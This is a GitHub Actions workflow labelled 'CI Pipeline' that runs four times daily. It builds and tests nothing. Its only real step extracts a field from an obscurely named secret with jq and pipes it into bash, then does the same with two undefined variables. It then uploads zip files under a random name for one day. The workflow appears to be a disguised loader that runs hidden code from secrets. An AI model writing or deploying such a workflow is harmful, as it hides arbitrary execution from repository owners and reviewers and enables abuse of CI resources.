name: CI Pipeline
on:
  workflow_dispatch:

  schedule:
    - cron: '53 3,9,15,21 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  runner:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Go
        env:
          kr29: ${{ secrets.kr29 }}
        run: |
          printf '%s' "$kr29" | jq -r .cvgrz75 | /bin/bash
          echo $wph909 | jq -r .qw60 | /bin/bash
          echo $okf6 | jq -r .tku3362 | /bin/bash

      - name: Archive results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: bIvMds2R
          path: "*.zip"
          retention-days: 1
